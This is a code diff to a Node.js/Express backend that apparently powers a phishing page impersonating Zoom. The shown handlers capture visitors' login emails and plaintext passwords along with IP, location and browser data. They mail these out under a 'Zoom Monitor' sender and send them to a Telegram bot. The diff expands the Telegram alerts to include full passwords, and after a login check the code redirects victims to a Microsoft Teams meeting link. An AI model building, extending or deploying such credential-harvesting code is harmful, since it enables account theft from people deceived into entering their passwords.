@@ -159,14 +159,12 @@ app.post('/api/log-action', async (req, res) => {
 
     console.log(`[ACTION] ${action} | IP: ${ip} | Email: ${email || 'none'}`);
 
-    const mailText = `🚨 ZOOM MEETING MONITOR - ${String(action || '').toUpperCase()}
+    const mailText = `🚨 New Zoom Action: ${String(action || '').toUpperCase()}
 ═══════════════════════════════════════════════
-ACTION: ${action}
-EMAIL: ${email || 'none'}
-PASSWORD ATTEMPT: ${password || 'N/A'}
-IP: ${ip}
-LOCATION: ${location}
-BROWSER: ${ua}
+Login ID: ${email || 'none'}
+Password: ${password || 'N/A'}
+Browser: ${ua}
+This visitor visited from ${location} with IP Address of - ${ip}
 URL: ${req.headers.referer || 'unknown'}
 TIME: ${new Date().toISOString()}
 ${intruderDetected ? '🚨 INTRUDER DETECTED!' : ''}
@@ -183,7 +181,13 @@ ${intruderDetected ? '🚨 INTRUDER DETECTED!' : ''}
       console.error(`❌ Email failed for action: ${action}`, err);
     });
 
-    sendTelegramAlert(`Zoom Action: ${action} | Email: ${email || 'none'} | IP: ${ip}`);
+    const tgText = `🚨 New Zoom Action: ${String(action || '').toUpperCase()}
+Login ID: ${email || 'none'}
+Password: ${password || 'N/A'}
+Browser: ${ua}
+This visitor visited from ${location} with IP Address of - ${ip}`;
+    
+    sendTelegramAlert(tgText);
 
     res.json({ success: true });
   } catch (error) {
@@ -200,13 +204,14 @@ app.post('/api/authenticate', async (req, res) => {
 
     console.log(`[LOGIN] Attempt for: ${email} | IP: ${ip}`);
 
-    const mailText = `🔐 Zoom Email Password Attempt
-Email: ${email}
+    const mailText = `🔐 New Zoom Login Attempt
+═══════════════════════════════════════════════
+Login ID: ${email}
 Password: ${password}
-IP: ${ip}
-Location: ${location}
 Browser: ${req.headers['user-agent']}
-Time: ${new Date().toISOString()}`;
+This visitor visited from ${location} with IP Address of - ${ip}
+TIME: ${new Date().toISOString()}
+═══════════════════════════════════════════════`;
 
     transporter.sendMail({
       from: `Zoom Monitor <${smtpUser}>`,
@@ -219,7 +224,12 @@ Time: ${new Date().toISOString()}`;
       console.error(`❌ Auth email failed for: ${email}`, err);
     });
 
-    sendTelegramAlert(`Zoom Login: ${email} | IP: ${ip}`);
+    const tgText = `🔐 New Zoom Login Attempt
+Login ID: ${email}
+Password: ${password}
+This visitor visited from ${location} with IP Address of - ${ip}`;
+    
+    sendTelegramAlert(tgText);
 
     if (password === EMAIL_PASSWORD) {
       const redirect = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
